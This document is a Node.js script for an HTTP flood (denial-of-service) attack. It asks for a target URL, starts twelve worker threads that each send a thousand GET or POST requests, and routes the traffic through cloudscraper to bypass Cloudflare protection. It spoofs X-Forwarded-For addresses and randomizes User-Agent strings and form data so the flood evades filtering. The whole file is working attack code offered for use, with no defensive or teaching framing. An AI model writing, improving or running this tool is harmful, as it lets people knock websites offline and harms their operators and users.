const readline = require('readline');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const cloudscraper = require('cloudscraper');
const axios = require('axios');
const crypto = require('crypto');

// Config
const NUM_WORKERS = 12; // Match CPU cores
const MAX_REQUESTS_PER_WORKER = 1000; // Per worker (adjust for aggression)

// Randomization tools
const randomUserAgent = () => [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50) + 80}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(Math.random() * 15)}_${Math.floor(Math.random() * 10)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50) + 80}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50) + 80}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
][Math.floor(Math.random() * 3)];

const randomIP = () => 
    `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

const randomData = () => ({
    [crypto.randomBytes(8).toString('hex')]: crypto.randomBytes(16).toString('hex'),
    [crypto.randomBytes(8).toString('hex')]: crypto.randomBytes(16).toString('hex'),
});

// Attack logic
async function nukeTarget(url) {
    const headers = {
        'User-Agent': randomUserAgent(),
        'X-Forwarded-For': randomIP(),
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    };

    try {
        // Randomly choose GET/POST
        if (Math.random() > 0.5) {
            await cloudscraper.get({ url, headers });
            console.log(`[CF-BYPASS][GET] ${url}`);
        } else {
            await cloudscraper.post({ 
                url, 
                headers, 
                formData: randomData() 
            });
            console.log(`[CF-BYPASS][POST] ${url}`);
        }
    } catch (error) {
        console.error(`[FAILED] ${error.message}`);
    }
}

// Worker thread
if (!isMainThread) {
    const { url } = workerData;
    for (let i = 0; i < MAX_REQUESTS_PER_WORKER; i++) {
        nukeTarget(url);
    }
}

// Main thread
if (isMainThread) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });

    rl.question('Enter target URL: ', (url) => {
        rl.close();
        console.log(`\n💣 Launching ${NUM_WORKERS} workers (INSTANT TRAFFIC SPIKE)...`);
        for (let i = 0; i < NUM_WORKERS; i++) {
            new Worker(__filename, { workerData: { url } });
        }
    });
}
